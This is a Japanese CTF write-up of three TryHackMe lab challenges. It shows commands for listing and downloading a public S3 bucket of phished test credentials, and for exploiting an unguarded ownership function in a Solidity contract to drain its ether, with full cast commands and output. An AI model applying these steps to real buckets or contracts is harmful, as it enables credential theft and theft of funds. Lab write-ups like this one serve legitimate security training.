# Hackfinity Battle CTF

「From the Hackfinity Battle CTF event」として同時公開された、3つのチャレンジ。

## １．A Bucket of Phish

https://tryhackme.com/room/hfb1abucketofphish

フィッシングサイトのURLが下記で、被害者ユーザーのリストを取得するという設定。

http://darkinjector-phish.s3-website-us-west-2.amazonaws.com

バケットに保存されているファイルを探す。

```sh
$ aws s3 ls s3://darkinjector-phish --region us-west-2 --no-sign-request
2025-03-17 15:46:17        132 captured-logins-093582390
2025-03-17 15:25:33       2300 index.html
```

```sh
$ aws s3 cp s3://darkinjector-phish/captured-logins-093582390 ./ --region us-west-2 --no-sign-request
download: s3://darkinjector-phish/captured-logins-093582390 to ./captured-logins-093582390

$ cat ./captured-logins-093582390 
user,pass
munra@thm.thm,Password123
test@thm.thm,123456
mario@thm.thm,Mario123
flag@thm.thm,THM{.............................}
```

## ２．PassCode

https://tryhackme.com/room/hfb1passcode

```
DarkInjectブロックチェーンのシステムの脆弱性を悪用し、侵入する方法を見つけたかもしれない。これが彼らを永久に阻止する唯一のチャンスかもしれない。
```
という設定。

問題文に書かれていたコマンド

```sh
root@attacker:~# RPC_URL=http://10.10.201.111:8545
root@attacker:~# API_URL=http://10.10.201.111
root@attacker:~# PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
root@attacker:~# CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
root@attacker:~# PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
root@attacker:~# is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
root@attacker:~# echo "Check if is solved: $is_solved"
Check if is solved: false
```

実行して変数を確認する。

```sh
$ PRIVATE_KEY=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.private_key")
echo $PRIVATE_KEY

CONTRACT_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".contract_address")
echo $CONTRACT_ADDRESS

PLAYER_ADDRESS=$(curl -s ${API_URL}/challenge | jq -r ".player_wallet.address")
echo $PLAYER_ADDRESS

0x60b06c11c63bced0bcd0cfeff4e3076d2f3a41969f5b31010cbda7821c89b7bd
0xf22cB0Ca047e88AC996c17683Cee290518093574
0xC21eEa642a971F063faA8a32BB4412226F5f8C1e
```

```sh
$ curl -s ${API_URL}/challenge
{"name":"blockchain","description":"Goal: have the isSolved() function return true","status":"DEPLOYED","blockTime":0,"rpc_url":"http://geth:8545","player_wallet":{"address":"0xC21eEa642a971F063faA8a32BB4412226F5f8C1e","private_key":"0x60b06c11c63bced0bcd0cfeff4e3076d2f3a41969f5b31010cbda7821c89b7bd","balance":"1.0 ETH"},"contract_address":"0xf22cB0Ca047e88AC996c17683Cee290518093574"}
```

ゴールは、isSolved() が true を返すことと書かれているが、ここまでの情報ではさっぱりわからない。

```
Goal: have the isSolved() function return true
```

80ポートにアクセスすると、スマートコントラクトコードが表示され、理解した。

```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    string private secret = "THM{}";
    bool private unlock_flag = false;
    uint256 private code;
    string private hint_text;
    
    constructor(string memory flag, string memory challenge_hint, uint256 challenge_code) {
        secret = flag;
        code = challenge_code;
        hint_text = challenge_hint;
    }
    
    function hint() external view returns (string memory) {
        return hint_text;
    }
    
    function unlock(uint256 input) external returns (bool) {
        if (input == code) {
            unlock_flag = true;
            return true;
        }
        return false;
    }
    
    function isSolved() external view returns (bool) {
        return unlock_flag;
    }
    
    function getFlag() external view returns (string memory) {
        require(unlock_flag, "Challenge not solved yet");
        return secret;
    }
}
```

- isSolved() は unlock_flag を返す。
- unlock_flag が true の状態で getFlag() を呼び出すと、secret が返る。
- unlock_flag を true にするには、unlock(uint256 input) で正しい整数値を入れて呼び出す必要がある。
- hint() 関数がヒントのテキストを返す。

ヒント。

```sh
$ hint=`cast call $CONTRACT_ADDRESS "hint()(string)" --rpc-url ${RPC_URL}`
echo $hint

"The code is 333"
```

アンロック。  
状態変更ありの関数（external）なので cat send を使っていることに注意。  
legacy を付けているのはエラー回避のため。

```sh
$ unlock=`cast send $CONTRACT_ADDRESS "unlock(uint256)" 333 --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --legacy`
echo $unlock


blockHash            0xd84f3ec1f276cf6ba39c982ced4b035dfe9d00306430b8f5e8dc070824896e94
blockNumber          3
contractAddress      
cumulativeGasUsed    43123
effectiveGasPrice    1000000000
from                 0xC21eEa642a971F063faA8a32BB4412226F5f8C1e
gasUsed              43123
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0xa34e1c064c492d48a515d706a124fbc96375c88c17403b0fb90a841fdd4d9b04
transactionIndex     0
type                 0
blobGasPrice         
blobGasUsed          
to                   0xf22cB0Ca047e88AC996c17683Cee290518093574
```

確認。

```sh
$ is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
echo "Check if is solved: $is_solved"

Check if is solved: true
```

フラグ取得。

```sh
$ flag=`cast call $CONTRACT_ADDRESS "getFlag()(string)" --rpc-url ${RPC_URL}`
echo $flag

"THM{................}"
```

## Heist

https://tryhackme.com/room/hfb1heist

例によって、webアクセスしたらスマートコントラクトコードが表示された。
```c
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Challenge {
    address private owner;
    address private initOwner;
    constructor() payable {
        owner = msg.sender;
        initOwner = msg.sender;
    }
    
    function changeOwnership() external {
            owner = msg.sender;
    }
    
    function withdraw() external {
        require(msg.sender == owner, "Not owner!");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    function getOwnerBalance() external view returns (uint256) {
        return address(initOwner).balance;
    }


    function isSolved() external view returns (bool) {
        return (address(this).balance == 0);
    }

    function getAddress() external view returns (address) {
        return msg.sender;
    }

     function getOwner() external view returns (address) {
        return owner;
    }
}
```

- 前のように、明確にフラグを返す関数は存在しない。
- この口座の残高が0になったら isSolved が true を返すようになっている。
- 要するに、この口座の残高を全額自分の口座に送金しろということだと思われる。

現在の状態を確認

```sh
$ address=`cast call $CONTRACT_ADDRESS "getAddress()(address)" --rpc-url ${RPC_URL}`
echo $address
0x0000000000000000000000000000000000000000
```

```sh
$ owner=`cast call $CONTRACT_ADDRESS "getOwner()(address)" --rpc-url ${RPC_URL}`
echo $owner
0x1A32A5377dF619580E3bEde8bff6C872797fE8aC
```

```sh
$ ret=`cast call $CONTRACT_ADDRESS "getBalance()(uint256)" --rpc-url ${RPC_URL}`
echo $ret
200000000000000000000 [2e20]
```

```sh
ret=`cast call $CONTRACT_ADDRESS "getOwnerBalance()(uint256)" --rpc-url ${RPC_URL}`
echo $ret
0
```

送信者のアドレスが0になっている。  
cast call なので、送信者が誰か特定されていない状態。

プライベートキーから自分のアドレスを取得。

```sh
$ MYADDR=`cast wallet address --private-key $PRIVATE_KEY`
echo $MYADDR 
0xB22a123114daD8e6701D194A6C0AB7de616A646d
```

fromを設定したら、返ってくるようになった。

```sh
$ address=`cast call $CONTRACT_ADDRESS "getAddress()(address)" --rpc-url ${RPC_URL} --from ${MYADDR}`
echo $address
0xB22a123114daD8e6701D194A6C0AB7de616A646d
```

オーナーシップ変更。

```sh
$ ret=`cast send $CONTRACT_ADDRESS "changeOwnership()()" --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --from ${MYADDR} --legacy`
echo $ret


blockHash            0xad0867164bfdb722b5df872cca25eb3e87afa7b7cfd14a901fffadeea8536fa6
blockNumber          4
contractAddress      
cumulativeGasUsed    27075
effectiveGasPrice    1000000000
from                 0xB22a123114daD8e6701D194A6C0AB7de616A646d
gasUsed              27075
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x31ccef3452852c6202e32ce949218a8791e3429d8c3559fb7b636e0541a0a9fa
transactionIndex     0
type                 0
blobGasPrice         
blobGasUsed          
to                   0xf22cB0Ca047e88AC996c17683Cee290518093574
```

送金。

```sh
$ ret=`cast send $CONTRACT_ADDRESS "withdraw()()" --rpc-url ${RPC_URL} --private-key ${PRIVATE_KEY} --from ${MYADDR} --legacy`
echo $ret


blockHash            0xe134d3bddbec81be735880d252cea558b66be3d8f24d809c1dd6a7fc5a49f95d
blockNumber          5
contractAddress      
cumulativeGasUsed    30414
effectiveGasPrice    1000000000
from                 0xB22a123114daD8e6701D194A6C0AB7de616A646d
gasUsed              30414
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x703592c542929f5beae0c0bc6a5051ceb80fc2b47b396a80a0417c1701f0ab2c
transactionIndex     0
type                 0
blobGasPrice         
blobGasUsed          
to                   0xf22cB0Ca047e88AC996c17683Cee290518093574
```

isSolvedがtrueを返すようになった。

```sh
$ is_solved=`cast call $CONTRACT_ADDRESS "isSolved()(bool)" --rpc-url ${RPC_URL}`
echo "Check if is solved: $is_solved"

Check if is solved: true
```

Web画面更新してフラグ取得ボタンを押したら、フラグが表示された。

